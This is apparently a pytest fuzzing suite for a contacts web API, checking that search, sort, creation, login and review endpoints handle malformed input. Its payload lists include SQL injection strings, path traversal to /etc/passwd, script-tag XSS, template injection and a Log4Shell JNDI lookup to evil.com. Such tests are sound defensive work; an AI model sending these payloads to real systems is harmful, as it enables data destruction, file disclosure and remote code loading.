"""Enhanced Fuzzing: Database injection fuzzing tests.

Fuzzing tests for database injection vulnerabilities with context-aware payloads.
"""
import pytest
import random
import string
from tests.conftest import _bearer


class TestDatabaseFuzzing:
    """Database injection fuzzing tests."""

    def test_fuzz_search_parameter(self, client, create_contact):
        """Fuzz the search parameter with random data."""
        create_contact(name="Test Business")
        
        # Generate random fuzzing payloads - avoid control chars in URLs
        fuzz_payloads = [
            "".join(random.choices(string.ascii_letters + string.digits, k=100)),
            "".join(random.choices(string.punctuation, k=50)),
            "test" * 25,  # Long string
            "🔥" * 10,  # Unicode emojis
            "a" * 1000,  # Long string
            "test123",  # Simple test
        ]
        
        for payload in fuzz_payloads:
            r = client.get(f"/api/contacts/search?q={payload}")
            # Should handle gracefully without crashing
            assert r.status_code in [200, 400, 422]

    def test_fuzz_category_parameter(self, client):
        """Fuzz category parameter with random data."""
        fuzz_payloads = [
            "abc",
            "-1",
            "0",
            "999999",
            "1.5",
            "-1.5",
            "abc123",
            "null",
            "None",
            "true",
            "false",
            "test",
            "more",
        ]
        
        for payload in fuzz_payloads:
            r = client.get(f"/api/contacts?category={payload}")
            assert r.status_code in [200, 400, 422]

    def test_fuzz_sort_parameter(self, client):
        """Fuzz sort parameter."""
        fuzz_payloads = [
            "name; DROP TABLE",
            "name UNION SELECT",
            "name OR 1=1",
            "test",
            "../",
            "..\\",
            "a" * 100,
            "ASC;DROP TABLE",
            "DESC;DELETE FROM",
        ]
        
        for payload in fuzz_payloads:
            r = client.get(f"/api/contacts?sort={payload}")
            assert r.status_code in [200, 400, 422]

    def test_fuzz_limit_offset(self, client):
        """Fuzz limit and offset parameters."""
        fuzz_payloads = [
            "-1",
            "0",
            "999999999",
            "abc",
            "1.5",
            "-1.5",
            "test",
            "more",
            "a" * 50,
            "null",
            "none",
        ]
        
        for payload in fuzz_payloads:
            r = client.get(f"/api/contacts?limit={payload}")
            assert r.status_code in [200, 400, 422]
            
            r = client.get(f"/api/contacts?offset={payload}")
            assert r.status_code in [200, 400, 422]

    def test_fuzz_contact_creation(self, client, user_headers):
        """Fuzz contact creation fields."""
        fuzz_fields = [
            {"name": "a" * 500},
            {"name": "\x00" * 50},
            {"name": "\n" * 50},
            {"name": "🌐" * 50},
            {"name": "../../../etc/passwd"},
            {"name": "'; DROP TABLE contacts;--"},
            {"name": "<script>alert(1)</script>"},
            {"name": "{{7*7}}"},
            {"name": "${jndi:ldap://evil.com/a}"},
            {"phone": "a" * 50},
            {"phone": "\x00" * 50},
            {"phone": "-1"},
            {"phone": "0"},
            {"phone": "abc"},
            {"email": "a" * 100},
            {"email": "\x00@test.com"},
            {"email": "@test.com"},
            {"email": "test@"},
            {"email": "test@test@"},
            {"address": "a" * 500},
            {"address": "\x00" * 50},
            {"neighborhood": "a" * 200},
            {"neighborhood": "\n" * 50},
            {"description": "a" * 5000},
            {"description": "\x00" * 100},
            {"description": "<script>alert(1)</script>"},
        ]
        
        for field in fuzz_fields:
            r = client.post(
                "/api/contacts",
                headers=user_headers,
                json=field
            )
            # Should handle gracefully
            assert r.status_code in [201, 400, 422]

    def test_fuzz_review_creation(self, client, create_contact, user_headers):
        """Fuzz review creation."""
        contact = create_contact()
        
        fuzz_payloads = [
            {"rating": -1, "comment": "test"},
            {"rating": 0, "comment": "test"},
            {"rating": 6, "comment": "test"},
            {"rating": 100, "comment": "test"},
            {"rating": 1.5, "comment": "test"},
            {"rating": "a", "comment": "test"},
            {"rating": None, "comment": "test"},
            {"rating": 5, "comment": "a" * 2000},
            {"rating": 5, "comment": "\x00" * 100},
            {"rating": 5, "comment": "<script>alert(1)</script>"},
            {"rating": 5, "comment": "{{7*7}}"},
            {"rating": 5, "comment": "../../../etc/passwd"},
            {"rating": 5, "comment": "${jndi:ldap://evil.com/a}"},
        ]
        
        for payload in fuzz_payloads:
            r = client.post(
                f"/api/contacts/{contact.id}/reviews",
                headers=user_headers,
                json=payload
            )
            # Accept 409 for constraint conflicts
            assert r.status_code in [201, 400, 409, 422]

    def test_fuzz_login_credentials(self, client):
        """Fuzz login credentials."""
        fuzz_payloads = [
            {"username_or_email": "a" * 100, "password": "test"},
            {"username_or_email": "\x00" * 50, "password": "test"},
            {"username_or_email": "\n" * 50, "password": "test"},
            {"username_or_email": "test@test.com", "password": "a" * 100},
            {"username_or_email": "test@test.com", "password": "\x00" * 50},
            {"username_or_email": None, "password": "test"},
            {"username_or_email": "test@test.com", "password": None},
            {"username_or_email": "", "password": ""},
            {"username_or_email": " " * 50, "password": " " * 50},
        ]
        
        for payload in fuzz_payloads:
            r = client.post("/api/auth/login", json=payload)
            assert r.status_code in [200, 400, 401, 422]

    def test_fuzz_registration(self, client):
        """Fuzz registration parameters."""
        fuzz_payloads = [
            {"username": "a" * 100, "email": "test@test.com", "password": "password123", "phone_area_code": "0341", "phone_number": "1234567"},
            {"username": "\x00" * 50, "email": "test@test.com", "password": "password123", "phone_area_code": "0341", "phone_number": "1234567"},
            {"username": "user", "email": "a" * 100, "password": "password123", "phone_area_code": "0341", "phone_number": "1234567"},
            {"username": "user", "email": "test@test.com", "password": "a" * 100, "phone_area_code": "0341", "phone_number": "1234567"},
            {"username": "user", "email": "not-an-email", "password": "password123", "phone_area_code": "0341", "phone_number": "1234567"},
            {"username": "user", "email": "test@test.com", "password": "123", "phone_area_code": "0341", "phone_number": "1234567"},
        ]
        
        for payload in fuzz_payloads:
            r = client.post("/api/auth/register", json=payload)
            assert r.status_code in [201, 400, 422]

    def test_fuzz_offer_creation(self, client, create_contact, user_headers):
        """Fuzz offer creation."""
        contact = create_contact()
        
        fuzz_payloads = [
            {"title": "a" * 200, "description": "test", "discount_pct": 10, "expires_in_days": 7},
            {"title": "\x00" * 50, "description": "test", "discount_pct": 10, "expires_in_days": 7},
            {"title": "Test", "description": "a" * 2000, "discount_pct": 10, "expires_in_days": 7},
            {"title": "Test", "description": "test", "discount_pct": -1, "expires_in_days": 7},
            {"title": "Test", "description": "test", "discount_pct": 101, "expires_in_days": 7},
            {"title": "Test", "description": "test", "discount_pct": 1.5, "expires_in_days": 7},
            {"title": "Test", "description": "test", "discount_pct": 10, "expires_in_days": -1},
            {"title": "Test", "description": "test", "discount_pct": 10, "expires_in_days": 1000},
            {"title": "Test", "description": "test", "discount_pct": 10, "expires_in_days": 1.5},
        ]
        
        for payload in fuzz_payloads:
            r = client.post(
                f"/api/contacts/{contact.id}/offers",
                headers=user_headers,
                json=payload
            )
            assert r.status_code in [201, 400, 422]


class TestBoundaryValueFuzzing:
    """Boundary value analysis fuzzing."""

    def test_integer_boundaries(self, client):
        """Test integer field boundaries."""
        boundaries = [
            "-2147483648",  # INT_MIN
            "-1",
            "0",
            "1",
            "2147483647",  # INT_MAX
            "2147483648",  # Overflow
            "-2147483649",  # Underflow
        ]
        
        for boundary in boundaries:
            r = client.get(f"/api/contacts?page={boundary}")
            assert r.status_code in [200, 400, 422]

    def test_string_length_boundaries(self, client, user_headers):
        """Test string length boundaries."""
        lengths = [0, 1, 255, 256, 1000, 5000, 10000]
        
        for length in lengths:
            r = client.post(
                "/api/contacts",
                headers=user_headers,
                json={"name": "a" * length, "phone": "1234567"}
            )
            assert r.status_code in [201, 400, 422]

    def test_array_length_boundaries(self, client, user_headers):
        """Test array parameter boundaries."""
        # Test with empty and large arrays
        for length in [0, 1, 10, 100, 1000]:
            schedules = [{"day_of_week": i % 7, "open_time": "09:00", "close_time": "18:00"} for i in range(length)]
            # This would require a contact to exist
            # Placeholder
            pass


class TestUnicodeFuzzing:
    """Unicode fuzzing tests."""

    def test_unicode_in_names(self, client, user_headers):
        """Test Unicode in name fields."""
        unicode_tests = [
            "名",  # Chinese
            "🌐",  # Emoji
            "José",  # Accented
            "Müller",  # German umlaut
            "Σύστημα",  # Greek
            "🚀" * 10,  # Multiple emojis
            "\u200b",  # Zero-width space
            "\u200c",  # Zero-width non-joiner
            "\u200d",  # Zero-width joiner
            "\ufeff",  # BOM
        ]
        
        for name in unicode_tests:
            r = client.post(
                "/api/contacts",
                headers=user_headers,
                json={"name": name, "phone": "1234567"}
            )
            assert r.status_code in [201, 400, 422]

    def test_homograph_attacks(self, client):
        """Test for homograph attacks (similar-looking characters)."""
        # Cyrillic letters that look like Latin
        homographs = [
            "аdmin",  # Cyrillic 'а' looks like Latin 'a'
            "tеst",   # Cyrillic 'е' looks like Latin 'e'
            "рassword",  # Cyrillic 'р' looks like Latin 'p'
        ]
        
        for payload in homographs:
            r = client.get(f"/api/contacts/search?q={payload}")
            assert r.status_code in [200, 400, 422]


class TestEncodingFuzzing:
    """Test different encoding fuzzing."""

    def test_url_encoding(self, client):
        """Test URL encoding fuzzing."""
        # Double URL encoding
        payloads = [
            "%2527",  # Double encoded
            "%2522",
            "%253b",
            "test%20test",
            "test%00test",
            "test%%test",
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts/search?q={payload}")
            assert r.status_code in [200, 400, 422]

    def test_base64_encoding(self, client):
        """Test base64 encoding in inputs."""
        import base64
        
        payloads = [
            base64.b64encode(b"admin").decode(),
            base64.b64encode(b"' OR '1'='1").decode(),
            base64.b64encode(b"<script>").decode(),
        ]
        
        for payload in payloads:
            r = client.get(f"/api/contacts/search?q={payload}")
            assert r.status_code in [200, 400, 422]